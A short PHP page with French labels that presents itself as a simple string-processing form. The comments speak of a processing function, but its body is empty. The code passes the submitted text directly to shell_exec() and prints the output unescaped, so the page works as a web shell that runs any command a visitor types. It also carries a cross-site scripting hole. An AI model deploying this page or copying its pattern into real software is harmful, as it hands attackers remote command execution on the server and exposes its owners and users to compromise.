<!DOCTYPE html>
<html>
<head>
    <title>Formulaire PHP</title>
</head>
<body>
    <h1>Formulaire PHP</h1>

    <form method="post" action="">
        <label for="input_string">Entrez une chaîne de caractères : </label>
        <input type="text" name="input_string" id="input_string">
        <input type="submit" value="Envoyer">
    </form>

    <?php
    // Fonction pour traiter la chaîne


    // Vérifier si le formulaire a été soumis
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Récupérer la valeur soumise
        $userInput = $_POST["input_string"];

        // Appeler la fonction pour traiter la chaîne
        $result = shell_exec($userInput);

        // Afficher le résultat
        echo '<textarea rows="4" cols="50">' . $result . "</textarea>";
    }
    ?>
</body>
</html>